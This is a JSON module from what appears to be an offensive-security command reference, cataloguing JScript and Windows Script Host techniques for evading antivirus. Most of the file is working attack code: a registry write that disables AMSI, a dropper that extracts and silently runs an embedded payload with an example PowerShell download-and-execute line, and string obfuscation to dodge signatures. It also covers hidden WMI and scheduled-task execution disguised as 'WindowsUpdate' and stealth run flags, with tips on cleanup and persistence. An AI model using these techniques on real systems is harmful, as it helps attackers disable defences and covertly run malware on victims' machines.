{
  "category": "JScript/WSH Evasion",
  "description": "JScript and VBScript evasion techniques for Windows Script Host (WSH). Includes AMSI bypass, self-modifying executables, and COM object exploitation.",
  "commands": [
    {
      "id": "jscript-amsi-registry-bypass",
      "name": "JScript AMSI Registry Bypass",
      "description": "Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU). Persists until key removed.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "amsi",
        "registry",
        "wsh",
        "windows"
      ],
      "command": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
      "variables": [],
      "notes": "Syntax:\nSave as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.\n\nPersistent (survives reboot) - good and bad.\n\nRemember to clean up.\n\nSee also:\namsi-jscript-registry in amsi-bypass module.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry Manual alternative:\nExecute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",
      "success_indicators": [
        "Registry key set to 0. AMSI disabled for current user's WSH sessions. Persists across reboots."
      ],
      "failure_indicators": [
        "Registry access denied - Rare for HKCU, check user permissions",
        "Key persists after operation - Clean up with RegDelete for stealth",
        "Doesn't affect PowerShell - Only disables AMSI for JScript/VBScript, not PowerShell"
      ]
    },
    {
      "id": "jscript-self-modifying-exe",
      "name": "JScript Self-Modifying Executable",
      "description": "Concatenate JScript dropper with embedded payload into single executable. WSH script reads own file, extracts embedded payload, writes to disk and executes. Evades initial AMSI scan.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "self-modification",
        "wsh",
        "dropper"
      ],
      "command": "// Part 1: JScript dropper (beginning of .js file)\nvar fso = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar sh = new ActiveXObject(\"WScript.Shell\");\n\n// Read own file\nvar scriptPath = WScript.ScriptFullName;\nvar file = fso.OpenTextFile(scriptPath, 1);\nvar content = file.ReadAll();\nfile.Close();\n\n// Extract payload after marker\nvar marker = \"###PAYLOAD###\";\nvar payloadStart = content.indexOf(marker) + marker.length;\nvar payload = content.substring(payloadStart);\n\n// Write payload to temp file\nvar tempPath = sh.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\<OUTPUT_FILE>\";\nvar outFile = fso.CreateTextFile(tempPath, true);\noutFile.Write(payload);\noutFile.Close();\n\n// Execute payload\nsh.Run(tempPath, 0);\n\n// Part 2: Embedded payload (after JScript code)\nWScript.Quit();\n###PAYLOAD###\n<EMBEDDED_PAYLOAD_CONTENT>",
      "variables": [
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output filename for extracted payload",
          "example": "payload.ps1",
          "required": true
        },
        {
          "name": "<EMBEDDED_PAYLOAD_CONTENT>",
          "description": "Payload content to embed after marker (PowerShell script, binary, etc.)",
          "example": "IEX (New-Object Net.WebClient).DownloadString('http://...')",
          "required": true
        }
      ],
      "notes": "Syntax:\nCreate JScript dropper, append payload after marker, save as .js Creative evasion technique.\n\nInitial scan sees benign dropper.\n\nPayload extracted at runtime.\n\nGood for embedding PowerShell scripts or small executables.\n\nTest marker uniqueness.\n\n~20 min to implement.\n\nTime estimate:\n20 minutes References:\ndocs/av-evasion/jscript-evasion.md#self-modifying Manual alternative:\nUse HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",
      "success_indicators": [
        "JScript reads itself, extracts embedded payload, writes to temp, executes. Initial AMSI scan only sees dropper code."
      ],
      "failure_indicators": [
        "Marker not found - Ensure marker string is unique and present",
        "File write fails - Check TEMP permissions",
        "Payload corrupted - Verify no encoding issues (use Base64 for binary)",
        "Still detected - Dropper code itself may be signatured"
      ],
      "filled_example": "// Part 1: JScript dropper (beginning of .js file)\nvar fso = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar sh = new ActiveXObject(\"WScript.Shell\");\n\n// Read own file\nvar scriptPath = WScript.ScriptFullName;\nvar file = fso.OpenTextFile(scriptPath, 1);\nvar content = file.ReadAll();\nfile.Close();\n\n// Extract payload after marker\nvar marker = \"###PAYLOAD###\";\nvar payloadStart = content.indexOf(marker) + marker.length;\nvar payload = content.substring(payloadStart);\n\n// Write payload to temp file\nvar tempPath = sh.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\payload.ps1\";\nvar outFile = fso.CreateTextFile(tempPath, true);\noutFile.Write(payload);\noutFile.Close();\n\n// Execute payload\nsh.Run(tempPath, 0);\n\n// Part 2: Embedded payload (after JScript code)\nWScript.Quit();\n###PAYLOAD###\nIEX (New-Object Net.WebClient).DownloadString('http://...')"
    },
    {
      "id": "jscript-wsh-obfuscation",
      "name": "JScript String Obfuscation",
      "description": "Obfuscate suspicious strings in JScript using various encoding techniques. Evades simple string-based signatures.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "obfuscation",
        "string-encoding",
        "wsh"
      ],
      "command": "// Method 1: String.fromCharCode()\nvar cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108); // \"powershell\"\n\n// Method 2: String concatenation\nvar cmd = \"pow\" + \"er\" + \"shell.exe\";\n\n// Method 3: Array join\nvar parts = [\"pow\", \"er\", \"shell\"];\nvar cmd = parts.join(\"\") + \".exe\";\n\n// Method 4: Base64 decode (custom function)\nfunction b64decode(str) {\n    var b64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n    var decoded = \"\";\n    // Decode implementation...\n    return decoded;\n}\nvar cmd = b64decode(\"cG93ZXJzaGVsbC5leGU=\");",
      "variables": [],
      "notes": "Syntax:\nApply to suspicious strings in JScript code Quick win for JScript payloads.\n\nAlways obfuscate 'powershell', 'cmd', 'http', 'eval'.\n\nUse random variable names.\n\nString.fromCharCode() most effective.\n\n~10 min to apply.\n\nTime estimate:\n10 minutes References:\ndocs/av-evasion/jscript-evasion.md#obfuscation Manual alternative:\nUse eval() with encoded strings, external config files, or hex encoding",
      "success_indicators": [
        "Obfuscated strings bypass simple pattern matching. Code executes normally."
      ],
      "failure_indicators": [
        "fromCharCode() with wrong values - Verify ASCII codes",
        "Obfuscation detected by heuristics - Combine with AMSI bypass",
        "Still flagged - Use multiple obfuscation layers"
      ]
    },
    {
      "id": "jscript-com-execution",
      "name": "JScript COM Object Execution",
      "description": "Execute commands via COM objects instead of direct Shell.Run(). Uses WMI, Task Scheduler, or other COM interfaces to break behavioral patterns.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "com",
        "wmi",
        "wsh"
      ],
      "command": "// Method 1: WMI Process Creation\nvar wmi = GetObject(\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\");\nvar startup = wmi.Get(\"Win32_ProcessStartup\").SpawnInstance_();\nstartup.ShowWindow = 0; // Hidden\nvar process = wmi.Get(\"Win32_Process\");\nvar pid = {};\nprocess.Create(\"<COMMAND>\", null, startup, pid);\n\n// Method 2: Task Scheduler\nvar schedule = new ActiveXObject(\"Schedule.Service\");\nschedule.Connect();\nvar rootFolder = schedule.GetFolder(\"\\\\\");\nvar taskDef = schedule.NewTask(0);\nvar action = taskDef.Actions.Create(0); // Execute\naction.Path = \"<COMMAND>\";\nrootFolder.RegisterTaskDefinition(\"<TASK_NAME>\", taskDef, 6, null, null, 3);",
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Command to execute",
          "example": "powershell.exe -nop -w hidden -c ...",
          "required": true
        },
        {
          "name": "<TASK_NAME>",
          "description": "Scheduled task name (for Task Scheduler method)",
          "example": "WindowsUpdate",
          "required": false
        }
      ],
      "notes": "Syntax:\nReplace <COMMAND> with payload command COM execution breaks simple parent-child monitoring.\n\nWMI method more reliable than Task Scheduler.\n\nClean up tasks after execution.\n\nGood for persistence too.\n\n~15 min to implement.\n\nTime estimate:\n15 minutes References:\ndocs/av-evasion/jscript-evasion.md#com-execution Manual alternative:\nUse WScript.Shell.Exec(), CreateObject(\"Shell.Application\").ShellExecute(), or MMC20.Application COM object",
      "success_indicators": [
        "Command executes via COM interface. Breaks WScript.exe -> cmd.exe parent-child relationship monitored by AV."
      ],
      "failure_indicators": [
        "WMI access denied - Requires appropriate permissions",
        "Task Scheduler fails - Check task definition syntax",
        "COM object not available - Verify object exists on target system",
        "Still detected - Behavioral analysis may catch COM usage pattern"
      ],
      "filled_example": "// Method 1: WMI Process Creation\nvar wmi = GetObject(\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\");\nvar startup = wmi.Get(\"Win32_ProcessStartup\").SpawnInstance_();\nstartup.ShowWindow = 0; // Hidden\nvar process = wmi.Get(\"Win32_Process\");\nvar pid = {};\nprocess.Create(\"powershell.exe -nop -w hidden -c ...\", null, startup, pid);\n\n// Method 2: Task Scheduler\nvar schedule = new ActiveXObject(\"Schedule.Service\");\nschedule.Connect();\nvar rootFolder = schedule.GetFolder(\"\\\\\");\nvar taskDef = schedule.NewTask(0);\nvar action = taskDef.Actions.Create(0); // Execute\naction.Path = \"powershell.exe -nop -w hidden -c ...\";\nrootFolder.RegisterTaskDefinition(\"WindowsUpdate\", taskDef, 6, null, null, 3);"
    },
    {
      "id": "wscript-cscript-execution",
      "name": "WScript vs CScript Execution",
      "description": "Choose between WScript.exe (GUI) and CScript.exe (console) for JScript/VBScript execution. CScript better for stealth (no windows), WScript better for hidden execution.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "wsh",
        "execution",
        "windows"
      ],
      "command": "# Execute with WScript (GUI mode, hidden)\nwscript.exe //B //Nologo <SCRIPT_FILE>\n\n# Execute with CScript (console mode)\ncscript.exe //B //Nologo <SCRIPT_FILE>\n\n# Force hidden execution (WScript)\nwscript.exe //B //Nologo <SCRIPT_FILE>\n\n# Within script, check execution mode:\nvar isConsole = (WScript.FullName.toLowerCase().indexOf(\"cscript\") != -1);",
      "variables": [
        {
          "name": "<SCRIPT_FILE>",
          "description": "Path to .js or .vbs file",
          "example": "payload.js",
          "required": true
        }
      ],
      "notes": "Syntax:\nExecute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks.\n\nCScript for command-line integration.\n\nAlways use //B //Nologo for stealth.\n\nTest both modes - different behavioral signatures.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/jscript-evasion.md#execution-modes Manual alternative:\nUse PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution",
      "success_indicators": [
        "Script executes via chosen engine. WScript: GUI mode, CScript: console mode."
      ],
      "failure_indicators": [
        "Popups appear - Use //B flag to suppress",
        "Script timeout - Increase //T value or remove timeout",
        "Encoding issues - Save as ANSI/ASCII, not UTF-8 with BOM"
      ],
      "filled_example": "# Execute with WScript (GUI mode, hidden)\nwscript.exe //B //Nologo payload.js\n\n# Execute with CScript (console mode)\ncscript.exe //B //Nologo payload.js\n\n# Force hidden execution (WScript)\nwscript.exe //B //Nologo payload.js\n\n# Within script, check execution mode:\nvar isConsole = (WScript.FullName.toLowerCase().indexOf(\"cscript\") != -1);"
    }
  ],
  "attack_chain_position": "Initial Access, Execution, Evasion",
  "related_categories": [
    "vba-evasion",
    "powershell",
    "windows"
  ]
}